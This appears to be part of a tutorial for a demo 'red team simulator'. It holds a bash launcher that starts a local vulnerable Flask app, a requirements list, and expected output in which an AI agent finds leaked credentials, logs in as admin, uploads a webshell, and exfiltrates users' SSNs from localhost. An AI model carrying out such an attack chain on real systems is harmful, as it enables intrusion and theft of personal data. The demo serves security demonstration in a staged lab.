#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║     CEREBRAS RED TEAM SIMULATOR - LIVE DEMONSTRATION         ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Check for API key
if [ -z "$CEREBRAS_API_KEY" ]; then
    echo -e "${RED}Error: CEREBRAS_API_KEY not set${NC}"
    exit 1
fi

# Start vulnerable app in background
echo -e "${GREEN}[1/3] Starting vulnerable target...${NC}"
cd vulnerable_app
python app.py &
APP_PID=$!
cd ..
sleep 2

# Verify app is running
if ! curl -s http://localhost:5000 > /dev/null; then
    echo -e "${RED}Failed to start vulnerable app${NC}"
    kill $APP_PID 2>/dev/null
    exit 1
fi
echo -e "${GREEN}Target running at http://localhost:5000${NC}"
echo ""

# Run attack
echo -e "${GREEN}[2/3] Launching autonomous attack...${NC}"
echo ""
python main.py --target http://localhost:5000 --max-steps 15

# Cleanup
echo ""
echo -e "${GREEN}[3/3] Cleaning up...${NC}"
kill $APP_PID 2>/dev/null

echo ""
echo -e "${CYAN}Demo complete!${NC}"
```

---

### PHASE 8: requirements.txt
```
requests>=2.31.0
rich>=13.7.0
flask>=3.0.0
```

---

### Expected Demo Output

When you run this, it should look like:
```
╔═══════════════════════════════════════════════════════════════╗
║     CEREBRAS RED TEAM SIMULATOR - LIVE DEMONSTRATION         ║
╚═══════════════════════════════════════════════════════════════╝

🎯 CEREBRAS RED TEAM SIMULATOR
   Target: http://localhost:5000

[0.3s] 🧠 THINK: Starting recon. Need to map the target and find entry points...
   └─ Inference: 89ms
[0.3s] ⚡ ACTION: scan_paths(base_url="http://localhost:5000")
[0.8s] ✅ OBSERVE: Path scan complete. Found 4 accessible paths:
   /login (200 OK), /backup (200 OK), /backup/config.php.bak (200 OK), /admin (302)
   └─ Execution: 412ms

[1.1s] 🧠 THINK: Found exposed backup directory with config file. This often contains credentials...
   └─ Inference: 67ms
[1.1s] ⚡ ACTION: read_file(url="http://localhost:5000/backup/config.php.bak")
[1.4s] ✅ OBSERVE: File contents: <?php $admin_user = "admin"; $admin_pass = "admin123"; ?>
   └─ Execution: 234ms

[1.7s] 🧠 THINK: Found hardcoded admin credentials! Attempting login...
   └─ Inference: 54ms
[1.7s] ⚡ ACTION: try_login(url="http://localhost:5000/login", username="admin", password="admin123")
[2.1s] ✅ OBSERVE: LOGIN SUCCESSFUL! Logged in as admin. Session established.
   └─ Execution: 389ms

[2.4s] 🧠 THINK: Have admin access. Looking for ways to escalate - file upload could give shell...
   └─ Inference: 71ms
[2.4s] ⚡ ACTION: upload_file(url="http://localhost:5000/admin/upload", filename="shell.php")
[2.8s] ✅ OBSERVE: FILE UPLOADED SUCCESSFULLY! Accessible at: /uploads/shell.php
   └─ Execution: 312ms

[3.1s] 🧠 THINK: Webshell deployed. Now exfiltrating sensitive data...
   └─ Inference: 58ms
[3.1s] ⚡ ACTION: execute_command(shell_url="http://localhost:5000/uploads/shell.php", cmd="cat users.db")
[3.5s] ✅ OBSERVE: [{"username": "admin", "ssn": "123-45-6789"}, {"username": "john.doe", "ssn": "234-56-7890"}...]
   ⚠️ SENSITIVE DATA DETECTED - Added to loot!
   └─ Execution: 287ms

[3.8s] 🧠 THINK: Successfully exfiltrated user PII including SSNs. GOAL_ACHIEVED.
   └─ Inference: 45ms

╔══════════════════════════════════════════╗
║  🏆 Attack completed successfully!       ║
╚══════════════════════════════════════════╝

┌─────────────────────────────────────┐
│         Attack Summary              │
├──────────────────┬──────────────────┤
│ Total Time       │ 3.8 seconds      │
│ Steps Taken      │ 6                │
│ Paths Discovered │ 4                │
│ Credentials Found│ 1                │
│ Footholds Gained │ 2                │
│ Data Exfiltrated │ 4 user records   │
└──────────────────┴──────────────────┘

⚡ SPEED COMPARISON

   Cerebras:  3.8 seconds
   GPT-4 est: ~18 seconds
   Speedup:   4.7x faster